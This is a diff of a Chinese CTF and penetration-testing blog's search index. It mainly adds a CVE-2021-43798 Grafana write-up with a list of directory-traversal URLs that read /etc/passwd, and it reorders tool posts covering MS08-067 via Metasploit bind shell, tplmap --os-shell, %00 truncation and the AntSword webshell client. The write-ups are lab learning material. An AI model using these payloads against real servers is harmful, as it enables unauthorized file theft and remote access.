@@ -17,6 +17,45 @@
       </tags>
   </entry>
   <entry>
+    <title>CVE-2008-4250(445 RPC)</title>
+    <url>/2024/09/26/CVE-2008-4250-445-RPC/</url>
+    <content><![CDATA[<h4 id="CVE-2008-4250"><a href="#CVE-2008-4250" class="headerlink" title="CVE-2008-4250"></a>CVE-2008-4250</h4><h4 id="漏洞介绍"><a href="#漏洞介绍" class="headerlink" title="漏洞介绍"></a>漏洞介绍</h4><p>​     <strong>MS08-067漏洞全称是“Windows Server服务<strong><strong>RPC</strong></strong>请求缓冲区溢出漏洞”，攻击者利用受害者主机默认开放的<strong><strong>SMB</strong></strong>服务端口445，发送特殊RPC（<strong><strong>Remote Procedure Call</strong></strong>，<strong><strong>远程过程调用</strong></strong>）请求，造成栈缓冲区<strong><strong>内存</strong></strong>错误，从而被利用实施<strong><strong>远程代码执行</strong></strong>。同样也是利用RPC，这里是利用缓存区</strong></p>
+<h4 id="漏洞影响"><a href="#漏洞影响" class="headerlink" title="漏洞影响"></a>漏洞影响</h4><ul>
+<li>Windows 2000</li>
+<li>Windows XP</li>
+<li>Windows Server 2003</li>
+</ul>
+<h4 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h4><p>   <img data-src="https://cdn.jsdelivr.net/gh/muxiahuo/muxiahuo.github.io@main/source/images/202411171110515.png"></p>
+<p>   老样子扫一扫，确定445端口打开，多的不重复，就是进入msf，搜索ms08_067，进入设置IP和端口即可</p>
+<p>   set payload generic&#x2F;shell_bind_tcp</p>
+<p><img data-src="https://cdn.jsdelivr.net/gh/muxiahuo/muxiahuo.github.io@main/source/images/202411171110284.png"></p>
+<p><img data-src="https://cdn.jsdelivr.net/gh/muxiahuo/muxiahuo.github.io@main/source/images/202411171111570.png"></p>
+]]></content>
+      <categories>
+        <category>渗透</category>
+      </categories>
+      <tags>
+        <tag>CVE</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>GitHack</title>
+    <url>/2024/08/03/GitHack/</url>
+    <content><![CDATA[<p>&emsp;&emsp;GitHack针对于git泄露题目，通常先用dirsearch扫描出大量git推出为git泄露，就可以用此脚本进行源码获取，实用指数:⭐⭐⭐,安装方式挺简单，kali:</p>
+<figure class="highlight crmsh"><table><tr><td class="code"><pre><span class="line">git <span class="keyword">clone</span> <span class="title">https</span>://github.com/BugScanTeam/GitHack</span><br></pre></td></tr></table></figure>
+<p>&emsp;&emsp;使用方法:</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python2 GitHack.py http://example.com:8088/.git</span><br></pre></td></tr></table></figure>
+<p>&emsp;&emsp;然后会在dist生成一个文件夹，打开访问即可。</p>
+]]></content>
+      <categories>
+        <category>WEB</category>
+      </categories>
+      <tags>
+        <tag>工具|脚本 利用</tag>
+        <tag>信息收集</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>CVE-2003-0352(135 RPC)</title>
     <url>/2024/09/26/CVE-2003-0352-135-RPC/</url>
     <content><![CDATA[<h4 id="漏洞介绍"><a href="#漏洞介绍" class="headerlink" title="漏洞介绍"></a>漏洞介绍</h4><p>​     Microsoft的RPC(远程调用协议)部分在通过TCP&#x2F;IP处理信息交换时存在问题，远程攻击者可以利用这个漏洞以本地系统权限在系统上执行任意指令。</p>
@@ -68,94 +107,34 @@
   <entry>
     <title>CVE-2021-43798(Grafana)</title>
     <url>/2024/11/25/CVE-2021-43798-Grafana/</url>
-    <content><![CDATA[]]></content>
-  </entry>
-  <entry>
-    <title>CVE-2008-4250(445 RPC)</title>
-    <url>/2024/09/26/CVE-2008-4250-445-RPC/</url>
-    <content><![CDATA[<h4 id="CVE-2008-4250"><a href="#CVE-2008-4250" class="headerlink" title="CVE-2008-4250"></a>CVE-2008-4250</h4><h4 id="漏洞介绍"><a href="#漏洞介绍" class="headerlink" title="漏洞介绍"></a>漏洞介绍</h4><p>​     <strong>MS08-067漏洞全称是“Windows Server服务<strong><strong>RPC</strong></strong>请求缓冲区溢出漏洞”，攻击者利用受害者主机默认开放的<strong><strong>SMB</strong></strong>服务端口445，发送特殊RPC（<strong><strong>Remote Procedure Call</strong></strong>，<strong><strong>远程过程调用</strong></strong>）请求，造成栈缓冲区<strong><strong>内存</strong></strong>错误，从而被利用实施<strong><strong>远程代码执行</strong></strong>。同样也是利用RPC，这里是利用缓存区</strong></p>
-<h4 id="漏洞影响"><a href="#漏洞影响" class="headerlink" title="漏洞影响"></a>漏洞影响</h4><ul>
-<li>Windows 2000</li>
-<li>Windows XP</li>
-<li>Windows Server 2003</li>
+    <content><![CDATA[<h4 id="漏洞介绍"><a href="#漏洞介绍" class="headerlink" title="漏洞介绍"></a>漏洞介绍</h4><p>​     <strong>CVE-2021-43798</strong> 是 <a href="https://blog.csdn.net/weixin_44462773/article/details/135843318">Grafana</a> 的一个安全漏洞，它允许未经授权的攻击者通过目录遍历读取服务器上的敏感文件。这个漏洞影响 Grafana 8.0.0 到 8.3.0 版本。攻击者可以通过构造特殊的 HTTP 请求，利用 Grafana 的插件路径来访问本地文件系统上的任意文件。</p>
+<h4 id="漏洞影响"><a href="#漏洞影响" class="headerlink" title="漏洞影响"></a>漏洞影响</h4><p>​     Grafana 8.0.0 —— 8.3.0 </p>
+<h4 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h4><p>​      <img data-src="https://cdn.jsdelivr.net/gh/muxiahuo/muxiahuo.github.io@main/source/images/image-20241125201156120.png" alt="image-20241125201156120"></p>
+<p>​     在plugins.go的getPluginAssets函数中，获取用户传入的pluginId后，如果存在，则拼接插件目录和用户传入参数。未进行任何过滤，便直接返回</p>
+<p><img data-src="https://cdn.jsdelivr.net/gh/muxiahuo/muxiahuo.github.io@main/source/images/image-20241125201305603.png" alt="image-20241125201305603"></p>
+<p>​      pluginId可以在这里看到。随便点个插件抓个包请求路径中就包含pluginId。这些插件是默认安装的，所以实际利用时不需要登录后查看</p>
+<p><img data-src="https://cdn.jsdelivr.net/gh/muxiahuo/muxiahuo.github.io@main/source/images/image-20241125201359504.png" alt="image-20241125201359504"></p>
+<h4 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h4><ul>
+<li><p>​    docker pull grafana&#x2F;grafana:8.2.6 </p>
+</li>
+<li><p>​    docker run -p 3000:3000 grafana&#x2F;grafana:8.2.6 </p>
+</li>
+<li><p>​    访问 <em><a href="http://localhost:3000/">http://localhost:3000</a></em></p>
+<p>或者在nssctf又对应靶机练习</p>
+<p>依据漏洞原理我们可以在插件后面添加我们想要访问的路径，有如下</p>
+<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line"><span class="regexp">/public/</span>plugins<span class="regexp">/alertGroups/</span>..<span class="regexp">/../</span>..<span class="regexp">/../</span>..<span class="regexp">/../</span>..<span class="regexp">/../</span>etc/passwd</span><br><span class="line"><span class="regexp">/public/</span>plugins<span class="regexp">/alertlist/</span>..<span class="regexp">/../</span>..<span class="regexp">/../</span>..<span class="regexp">/../</span>..<span class="regexp">/../</span>etc/passwd</span><br><span class="line"><span class="regexp">/public/</span>plugins<span class="regexp">/annolist/</span>..<span class="regexp">/../</span>..<span class="regexp">/../</span>..<span class="regexp">/../</span>..<span class="regexp">/../</span>etc/passwd</span><br><span class="line"><span class="regexp">/public/</span>plugins<span class="regexp">/barchart/</span>..<span class="regexp">/../</span>..<span class="regexp">/../</span>..<span class="regexp">/../</span>..<span class="regexp">/../</span>etc/passwd</span><br><span class="line"><span class="regexp">/public/</span>plugins<span class="regexp">/bargauge/</span>..<span class="regexp">/../</span>..<span class="regexp">/../</span>..<span class="regexp">/../</span>..<span class="regexp">/../</span>etc/passwd</span><br><span class="line"><span class="regexp">/public/</span>plugins<span class="regexp">/canvas/</span>..<span class="regexp">/../</span>..<span class="regexp">/../</span>..<span class="regexp">/../</span>..<span class="regexp">/../</span>etc/passwd</span><br><span class="line"><span class="regexp">/public/</span>plugins<span class="regexp">/dashlist/</span>..<span class="regexp">/../</span>..<span class="regexp">/../</span>..<span class="regexp">/../</span>..<span class="regexp">/../</span>etc/passwd</span><br><span class="line"><span class="regexp">/public/</span>plugins<span class="regexp">/debug/</span>..<span class="regexp">/../</span>..<span class="regexp">/../</span>..<span class="regexp">/../</span>..<span class="regexp">/../</span>etc/passwd</span><br><span class="line"><span class="regexp">/public/</span>plugins<span class="regexp">/gauge/</span>..<span class="regexp">/../</span>..<span class="regexp">/../</span>..<span class="regexp">/../</span>..<span class="regexp">/../</span>etc/passwd</span><br><span class="line"><span class="regexp">/public/</span>plugins<span class="regexp">/geomap/</span>..<span class="regexp">/../</span>..<span class="regexp">/../</span>..<span class="regexp">/../</span>..<span class="regexp">/../</span>etc/passwd</span><br><span class="line"><span class="regexp">/public/</span>plugins<span class="regexp">/gettingstarted/</span>..<span class="regexp">/../</span>..<span class="regexp">/../</span>..<span class="regexp">/../</span>..<span class="regexp">/../</span>etc/passwd</span><br><span class="line"><span class="regexp">/public/</span>plugins<span class="regexp">/graph/</span>..<span class="regexp">/../</span>..<span class="regexp">/../</span>..<span class="regexp">/../</span>..<span class="regexp">/../</span>etc/passwd</span><br><span class="line"><span class="regexp">/public/</span>plugins<span class="regexp">/heatmap/</span>..<span class="regexp">/../</span>..<span class="regexp">/../</span>..<span class="regexp">/../</span>..<span class="regexp">/../</span>etc/passwd</span><br><span class="line"><span class="regexp">/public/</span>plugins<span class="regexp">/histogram/</span>..<span class="regexp">/../</span>..<span class="regexp">/../</span>..<span class="regexp">/../</span>..<span class="regexp">/../</span>etc/passwd</span><br><span class="line"><span class="regexp">/public/</span>plugins<span class="regexp">/live/</span>..<span class="regexp">/../</span>..<span class="regexp">/../</span>..<span class="regexp">/../</span>..<span class="regexp">/../</span>etc/passwd</span><br><span class="line"><span class="regexp">/public/</span>plugins<span class="regexp">/logs/</span>..<span class="regexp">/../</span>..<span class="regexp">/../</span>..<span class="regexp">/../</span>..<span class="regexp">/../</span>etc/passwd</span><br><span class="line"><span class="regexp">/public/</span>plugins<span class="regexp">/news/</span>..<span class="regexp">/../</span>..<span class="regexp">/../</span>..<span class="regexp">/../</span>..<span class="regexp">/../</span>etc/passwd</span><br><span class="line"><span class="regexp">/public/</span>plugins<span class="regexp">/nodeGraph/</span>..<span class="regexp">/../</span>..<span class="regexp">/../</span>..<span class="regexp">/../</span>..<span class="regexp">/../</span>etc/passwd</span><br><span class="line"><span class="regexp">/public/</span>plugins<span class="regexp">/piechart/</span>..<span class="regexp">/../</span>..<span class="regexp">/../</span>..<span class="regexp">/../</span>..<span class="regexp">/../</span>etc/passwd</span><br><span class="line"><span class="regexp">/public/</span>plugins<span class="regexp">/pluginlist/</span>..<span class="regexp">/../</span>..<span class="regexp">/../</span>..<span class="regexp">/../</span>..<span class="regexp">/../</span>etc/passwd</span><br><span class="line"><span class="regexp">/public/</span>plugins<span class="regexp">/stat/</span>..<span class="regexp">/../</span>..<span class="regexp">/../</span>..<span class="regexp">/../</span>..<span class="regexp">/../</span>etc/passwd</span><br><span class="line"><span class="regexp">/public/</span>plugins<span class="regexp">/state-timeline/</span>..<span class="regexp">/../</span>..<span class="regexp">/../</span>..<span class="regexp">/../</span>..<span class="regexp">/../</span>etc/passwd</span><br><span class="line"><span class="regexp">/public/</span>plugins<span class="regexp">/status-history/</span>..<span class="regexp">/../</span>..<span class="regexp">/../</span>..<span class="regexp">/../</span>..<span class="regexp">/../</span>etc/passwd</span><br><span class="line"><span class="regexp">/public/</span>plugins<span class="regexp">/table/</span>..<span class="regexp">/../</span>..<span class="regexp">/../</span>..<span class="regexp">/../</span>..<span class="regexp">/../</span>etc/passwd</span><br><span class="line"><span class="regexp">/public/</span>plugins<span class="regexp">/table-old/</span>..<span class="regexp">/../</span>..<span class="regexp">/../</span>..<span class="regexp">/../</span>..<span class="regexp">/../</span>etc/passwd</span><br><span class="line"><span class="regexp">/public/</span>plugins<span class="regexp">/text/</span>..<span class="regexp">/../</span>..<span class="regexp">/../</span>..<span class="regexp">/../</span>..<span class="regexp">/../</span>etc/passwd</span><br><span class="line"><span class="regexp">/public/</span>plugins<span class="regexp">/timeseries/</span>..<span class="regexp">/../</span>..<span class="regexp">/../</span>..<span class="regexp">/../</span>..<span class="regexp">/../</span>etc/passwd</span><br><span class="line"><span class="regexp">/public/</span>plugins<span class="regexp">/welcome/</span>..<span class="regexp">/../</span>..<span class="regexp">/../</span>..<span class="regexp">/../</span>..<span class="regexp">/../</span>etc/passwd</span><br><span class="line"><span class="regexp">/public/</span>plugins<span class="regexp">/xychart/</span>..<span class="regexp">/../</span>..<span class="regexp">/../</span>..<span class="regexp">/../</span>..<span class="regexp">/../</span>etc/passwd</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>   用bp进行抓包访问这些路径</p>
+<p><img data-src="https://cdn.jsdelivr.net/gh/muxiahuo/muxiahuo.github.io@main/source/images/image-20241125203702949.png" alt="image-20241125203702949"></p>
+</li>
 </ul>
-<h4 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h4><p>   <img data-src="https://cdn.jsdelivr.net/gh/muxiahuo/muxiahuo.github.io@main/source/images/202411171110515.png"></p>
-<p>   老样子扫一扫，确定445端口打开，多的不重复，就是进入msf，搜索ms08_067，进入设置IP和端口即可</p>
-<p>   set payload generic&#x2F;shell_bind_tcp</p>
-<p><img data-src="https://cdn.jsdelivr.net/gh/muxiahuo/muxiahuo.github.io@main/source/images/202411171110284.png"></p>
-<p><img data-src="https://cdn.jsdelivr.net/gh/muxiahuo/muxiahuo.github.io@main/source/images/202411171111570.png"></p>
+<p>​       成功，nss直接访问flag即可</p>
 ]]></content>
       <categories>
         <category>渗透</category>
       </categories>
       <tags>
         <tag>CVE</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>GitHack</title>
-    <url>/2024/08/03/GitHack/</url>
-    <content><![CDATA[<p>&emsp;&emsp;GitHack针对于git泄露题目，通常先用dirsearch扫描出大量git推出为git泄露，就可以用此脚本进行源码获取，实用指数:⭐⭐⭐,安装方式挺简单，kali:</p>
-<figure class="highlight crmsh"><table><tr><td class="code"><pre><span class="line">git <span class="keyword">clone</span> <span class="title">https</span>://github.com/BugScanTeam/GitHack</span><br></pre></td></tr></table></figure>
-<p>&emsp;&emsp;使用方法:</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python2 GitHack.py http://example.com:8088/.git</span><br></pre></td></tr></table></figure>
-<p>&emsp;&emsp;然后会在dist生成一个文件夹，打开访问即可。</p>
-]]></content>
-      <categories>
-        <category>WEB</category>
-      </categories>
-      <tags>
-        <tag>工具|脚本 利用</tag>
-        <tag>信息收集</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Wappalyzer</title>
-    <url>/2024/07/24/Wappalyzer/</url>
-    <content><![CDATA[<p>&emsp;&emsp;Wappalyzer是一款开源的浏览器扩展，用于识别网站所使用的技术栈。它能够检测出使用的Web服务器、内容管理系统、编程语言、JavaScript库、框架等信息，并将其展示给用户。知道大体框架后，能为后面的查找和思路提供一些方便，闲着没事的时候就可以点一下，又没什么影响( ͡°❥ ͡°)。下载方法也很简单，同hackbar在扩展上搜索一下就是的啦。实用指数:⭐⭐⭐⭐</p>
-]]></content>
-      <categories>
-        <category>WEB</category>
-      </categories>
-      <tags>
-        <tag>工具|脚本 利用</tag>
-        <tag>信息收集</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>dirsearch</title>
-    <url>/2024/07/23/dirsearch/</url>
-    <content><![CDATA[<p>&emsp;&emsp;dirsearch用来暴力扫描一些基础的存在目录和文件，实用指数:⭐⭐⭐⭐,kali安装:</p>
-<figure class="highlight crmsh"><table><tr><td class="code"><pre><span class="line">git <span class="keyword">clone</span> <span class="title">https</span>://github.com/maurosoria/dirsearch.git</span><br></pre></td></tr></table></figure>
-<p>&emsp;&emsp;安装完之后就是安装依赖</p>
-<figure class="highlight jboss-cli"><table><tr><td class="code"><pre><span class="line"><span class="keyword">cd</span> dirsearch  <span class="string">//</span>进入dirsearch目录</span><br><span class="line"><span class="params">(sudo)</span> pip3 install -r requirements.txt <span class="string">//</span>可以tab补全，不能执行就用sudo</span><br></pre></td></tr></table></figure>
-<p>&emsp;&emsp;之后执行dirsearch.py</p>
-<figure class="highlight gcode"><table><tr><td class="code"><pre><span class="line"><span class="comment">(sudo)</span> pytho<span class="symbol">n3</span> dirsearch.py -h  <span class="comment">//查看帮助</span></span><br><span class="line"><span class="comment">(sudo)</span> pytho<span class="symbol">n3</span> dirsearch -u URL <span class="comment">//扫描开始</span></span><br></pre></td></tr></table></figure>
-<p>&emsp;&emsp;以上就是常规用法，知道扫描就行了。（后期帮助不大）</p>
-]]></content>
-      <categories>
-        <category>WEB</category>
-      </categories>
-      <tags>
-        <tag>基础</tag>
-        <tag>工具|脚本 利用</tag>
-        <tag>信息收集</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>eregi</title>
-    <url>/2024/07/17/eregi/</url>
-    <content><![CDATA[<p>&emsp;&emsp;eregi()函数用指定的模式搜索一个字符串中指定的字符串,布尔类型，如果匹配成功返回true,否则,则返回false。搜索字母的字符是大小写敏感的。有两个参数，eregi($pattern,$string),在$string里面搜索$pattern。</p>
-<h3 id="00截断"><a href="#00截断" class="headerlink" title="%00截断"></a>%00截断</h3><p>&emsp;&emsp;ereg函数存在NULL截断漏洞，即%00截断，可以使用%00绕过验证，例如</p>
-<figure class="highlight gams"><table><tr><td class="code"><pre><span class="line"><span class="meta"><span class="keyword">$a</span> = %00hello</span></span><br></pre></td></tr></table></figure>
-
-<h3 id="数组返回值"><a href="#数组返回值" class="headerlink" title="数组返回值"></a>数组返回值</h3><p>&emsp;&emsp;与其他不同的是，该函数若参数为数组是它的返回值不是FALSE，也不会报错。</p>
-]]></content>
-      <categories>
-        <category>PHP</category>
-      </categories>
-      <tags>
-        <tag>函数绕过</tag>
       </tags>
   </entry>
   <entry>
@@ -241,6 +220,68 @@
       </tags>
   </entry>
   <entry>
+    <title>dirsearch</title>
+    <url>/2024/07/23/dirsearch/</url>
+    <content><![CDATA[<p>&emsp;&emsp;dirsearch用来暴力扫描一些基础的存在目录和文件，实用指数:⭐⭐⭐⭐,kali安装:</p>
+<figure class="highlight crmsh"><table><tr><td class="code"><pre><span class="line">git <span class="keyword">clone</span> <span class="title">https</span>://github.com/maurosoria/dirsearch.git</span><br></pre></td></tr></table></figure>
+<p>&emsp;&emsp;安装完之后就是安装依赖</p>
+<figure class="highlight jboss-cli"><table><tr><td class="code"><pre><span class="line"><span class="keyword">cd</span> dirsearch  <span class="string">//</span>进入dirsearch目录</span><br><span class="line"><span class="params">(sudo)</span> pip3 install -r requirements.txt <span class="string">//</span>可以tab补全，不能执行就用sudo</span><br></pre></td></tr></table></figure>
+<p>&emsp;&emsp;之后执行dirsearch.py</p>
+<figure class="highlight gcode"><table><tr><td class="code"><pre><span class="line"><span class="comment">(sudo)</span> pytho<span class="symbol">n3</span> dirsearch.py -h  <span class="comment">//查看帮助</span></span><br><span class="line"><span class="comment">(sudo)</span> pytho<span class="symbol">n3</span> dirsearch -u URL <span class="comment">//扫描开始</span></span><br></pre></td></tr></table></figure>
+<p>&emsp;&emsp;以上就是常规用法，知道扫描就行了。（后期帮助不大）</p>
+]]></content>
+      <categories>
+        <category>WEB</category>
+      </categories>
+      <tags>
+        <tag>基础</tag>
+        <tag>工具|脚本 利用</tag>
+        <tag>信息收集</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Wappalyzer</title>
+    <url>/2024/07/24/Wappalyzer/</url>
+    <content><![CDATA[<p>&emsp;&emsp;Wappalyzer是一款开源的浏览器扩展，用于识别网站所使用的技术栈。它能够检测出使用的Web服务器、内容管理系统、编程语言、JavaScript库、框架等信息，并将其展示给用户。知道大体框架后，能为后面的查找和思路提供一些方便，闲着没事的时候就可以点一下，又没什么影响( ͡°❥ ͡°)。下载方法也很简单，同hackbar在扩展上搜索一下就是的啦。实用指数:⭐⭐⭐⭐</p>
+]]></content>
+      <categories>
+        <category>WEB</category>
+      </categories>
+      <tags>
+        <tag>工具|脚本 利用</tag>
+        <tag>信息收集</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>eregi</title>
+    <url>/2024/07/17/eregi/</url>
+    <content><![CDATA[<p>&emsp;&emsp;eregi()函数用指定的模式搜索一个字符串中指定的字符串,布尔类型，如果匹配成功返回true,否则,则返回false。搜索字母的字符是大小写敏感的。有两个参数，eregi($pattern,$string),在$string里面搜索$pattern。</p>
+<h3 id="00截断"><a href="#00截断" class="headerlink" title="%00截断"></a>%00截断</h3><p>&emsp;&emsp;ereg函数存在NULL截断漏洞，即%00截断，可以使用%00绕过验证，例如</p>
+<figure class="highlight gams"><table><tr><td class="code"><pre><span class="line"><span class="meta"><span class="keyword">$a</span> = %00hello</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="数组返回值"><a href="#数组返回值" class="headerlink" title="数组返回值"></a>数组返回值</h3><p>&emsp;&emsp;与其他不同的是，该函数若参数为数组是它的返回值不是FALSE，也不会报错。</p>
+]]></content>
+      <categories>
+        <category>PHP</category>
+      </categories>
+      <tags>
+        <tag>函数绕过</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>hackbar</title>
+    <url>/2024/07/13/hackbar/</url>
+    <content><![CDATA[<p>&emsp;&emsp;hackbar是一个用于谷歌和火狐浏览器的扩展插件，可以在浏览器的扩展直接下载添加，然后按F12即可，具体使用方法和操作可以在网上搜一抓一大把，(建议下载cracked&amp;fixed版本的，新版本好像要激活码还是什么的)我这里只做一个指路引导的作用。（Ｕ・ω・）⊃<br>&emsp;&emsp; 我们可以通过它进行自定义发送，手动构造GET,POST和COOKIE管理等方法，还具备有URL编码，base64编码，MD5加密 等的能力，还有很多功能等你慢慢沉淀挖掘，实用指数⭐⭐⭐⭐⭐</p>
+]]></content>
+      <categories>
+        <category>WEB</category>
+      </categories>
+      <tags>
+        <tag>基础</tag>
+        <tag>工具|脚本 利用</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>fenjing</title>
     <url>/2024/06/05/fenjing/</url>
     <content><![CDATA[<h2 id="Fenjing-焚靖"><a href="#Fenjing-焚靖" class="headerlink" title="Fenjing(焚靖)"></a>Fenjing(焚靖)</h2><h3 id="fenjing介绍"><a href="#fenjing介绍" class="headerlink" title="fenjing介绍"></a>fenjing介绍</h3><p>&emsp;&emsp;焚靖是一个针对CTF比赛中Jinja2 SSTI绕过WAF的全自动脚本，可以自动攻击给定的网站或接口。能解决常规性的SSTI题目，实用指数⭐⭐⭐</p>
@@ -262,19 +303,6 @@
         <category>SSTI</category>
       </categories>
       <tags>
-        <tag>工具|脚本 利用</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>hackbar</title>
-    <url>/2024/07/13/hackbar/</url>
-    <content><![CDATA[<p>&emsp;&emsp;hackbar是一个用于谷歌和火狐浏览器的扩展插件，可以在浏览器的扩展直接下载添加，然后按F12即可，具体使用方法和操作可以在网上搜一抓一大把，(建议下载cracked&amp;fixed版本的，新版本好像要激活码还是什么的)我这里只做一个指路引导的作用。（Ｕ・ω・）⊃<br>&emsp;&emsp; 我们可以通过它进行自定义发送，手动构造GET,POST和COOKIE管理等方法，还具备有URL编码，base64编码，MD5加密 等的能力，还有很多功能等你慢慢沉淀挖掘，实用指数⭐⭐⭐⭐⭐</p>
-]]></content>
-      <categories>
-        <category>WEB</category>
-      </categories>
-      <tags>
-        <tag>基础</tag>
         <tag>工具|脚本 利用</tag>
       </tags>
   </entry>
@@ -550,31 +578,6 @@
       </tags>
   </entry>
   <entry>
-    <title>tplmap</title>
-    <url>/2024/06/06/tplmap/</url>
-    <content><![CDATA[<h2 id="tplmap-py"><a href="#tplmap-py" class="headerlink" title="tplmap.py"></a>tplmap.py</h2><h3 id="tplmap介绍"><a href="#tplmap介绍" class="headerlink" title="tplmap介绍"></a>tplmap介绍</h3><p>&emsp;&emsp;Tplmap是一个python工具，可以通过使用沙箱转义技术找到代码注入和服务器端模板注入（SSTI）漏洞。该工具能够在许多模板引擎中利用SSTI来访问目标文件或操作系统。一些受支持的模板引擎包括PHP（代码评估），Ruby（代码评估），JaveScript（代码评估），Python（代码评估），ERB，Jinja2和Tornado。该工具可以执行对这些模板引擎的盲注入，并具有执行远程命令的能力。（说的高级吧，其实选用其他博主的(●’◡’●)）实用指数⭐⭐⭐</p>
-<h3 id="安装方法"><a href="#安装方法" class="headerlink" title="安装方法"></a>安装方法</h3><p>&emsp;&emsp;在kali或者linux安装即可</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/epinna/tplmap</span><br></pre></td></tr></table></figure>
-
-<p>&emsp;&emsp;进入该文件夹下安装依赖（就是安装库啦）</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> tplmap</span><br><span class="line">pip install -r requirements.txt</span><br></pre></td></tr></table></figure>
-<p>&emsp;&emsp;如果安装报错了，不妨试一试pip2安装，别问我怎么知道的，我就是(ᇂ_ᇂ|||)</p>
-<h3 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">GET:</span><br><span class="line">python3 tplmap.py -u &lt;URL:&gt;?name=</span><br><span class="line">POST:</span><br><span class="line">python3 tplmap.py -u &lt;URL:&gt; --data= name=</span><br></pre></td></tr></table></figure>
-
-<p><img data-src="/images/tplmap.png" alt="tplmap"></p>
-<p>&emsp;&emsp;如上面所示，可以得出模板是jinja2，如果下面那一段显示yes或者ok，那么可以直接用shell指令（–os-shell）。</p>
-<p>&emsp;&emsp;更多用法可以用help查看，很多python脚本都可以这样做(不认识英文直接去找翻译(ง •̀_•́)ง加油)</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python3 tplmap.py --<span class="built_in">help</span></span><br></pre></td></tr></table></figure>
-
-]]></content>
-      <categories>
-        <category>SSTI</category>
-      </categories>
-      <tags>
-        <tag>工具|脚本 利用</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>sql注入</title>
     <url>/2024/07/27/sql%E6%B3%A8%E5%85%A5/</url>
     <content><![CDATA[<p>&emsp;&emsp; 当用户输入账号和密码的时候，web应用会向后台数据库进行一个匹配，如果账号密码正确就会登入。而这个数据库例如MySQL,Oracle等一系列用的语句叫做sql语句，那么我们在传数据的时候，使用sql语句上传就会改变一个原有的结构，从而获取或修改数据库中的数据，而这个，就叫做sql注入。</p>
@@ -649,6 +652,31 @@
       <tags>
         <tag>注入</tag>
         <tag>sql注入</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>tplmap</title>
+    <url>/2024/06/06/tplmap/</url>
+    <content><![CDATA[<h2 id="tplmap-py"><a href="#tplmap-py" class="headerlink" title="tplmap.py"></a>tplmap.py</h2><h3 id="tplmap介绍"><a href="#tplmap介绍" class="headerlink" title="tplmap介绍"></a>tplmap介绍</h3><p>&emsp;&emsp;Tplmap是一个python工具，可以通过使用沙箱转义技术找到代码注入和服务器端模板注入（SSTI）漏洞。该工具能够在许多模板引擎中利用SSTI来访问目标文件或操作系统。一些受支持的模板引擎包括PHP（代码评估），Ruby（代码评估），JaveScript（代码评估），Python（代码评估），ERB，Jinja2和Tornado。该工具可以执行对这些模板引擎的盲注入，并具有执行远程命令的能力。（说的高级吧，其实选用其他博主的(●’◡’●)）实用指数⭐⭐⭐</p>
+<h3 id="安装方法"><a href="#安装方法" class="headerlink" title="安装方法"></a>安装方法</h3><p>&emsp;&emsp;在kali或者linux安装即可</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/epinna/tplmap</span><br></pre></td></tr></table></figure>
+
+<p>&emsp;&emsp;进入该文件夹下安装依赖（就是安装库啦）</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> tplmap</span><br><span class="line">pip install -r requirements.txt</span><br></pre></td></tr></table></figure>
+<p>&emsp;&emsp;如果安装报错了，不妨试一试pip2安装，别问我怎么知道的，我就是(ᇂ_ᇂ|||)</p>
+<h3 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">GET:</span><br><span class="line">python3 tplmap.py -u &lt;URL:&gt;?name=</span><br><span class="line">POST:</span><br><span class="line">python3 tplmap.py -u &lt;URL:&gt; --data= name=</span><br></pre></td></tr></table></figure>
+
+<p><img data-src="/images/tplmap.png" alt="tplmap"></p>
+<p>&emsp;&emsp;如上面所示，可以得出模板是jinja2，如果下面那一段显示yes或者ok，那么可以直接用shell指令（–os-shell）。</p>
+<p>&emsp;&emsp;更多用法可以用help查看，很多python脚本都可以这样做(不认识英文直接去找翻译(ง •̀_•́)ง加油)</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python3 tplmap.py --<span class="built_in">help</span></span><br></pre></td></tr></table></figure>
+
+]]></content>
+      <categories>
+        <category>SSTI</category>
+      </categories>
+      <tags>
+        <tag>工具|脚本 利用</tag>
       </tags>
   </entry>
   <entry>
@@ -764,6 +792,18 @@
       </tags>
   </entry>
   <entry>
+    <title>蚁剑</title>
+    <url>/2024/08/03/%E8%9A%81%E5%89%91/</url>
+    <content><![CDATA[<p>&emsp;&emsp;蚁剑是一个shell控制端软件，最核心的功能就是获取网站的源码和执行shell，同时具备插件的功能，功能性很强大的一款，同时搭配木马上传使用，上传一句话木马，然后用蚁剑连接。链接如下:<a href="https://blog.csdn.net/weixin_42474304/article/details/116376746">蚁剑下载和安装</a>,实用指数:⭐⭐⭐⭐⭐</p>
+]]></content>
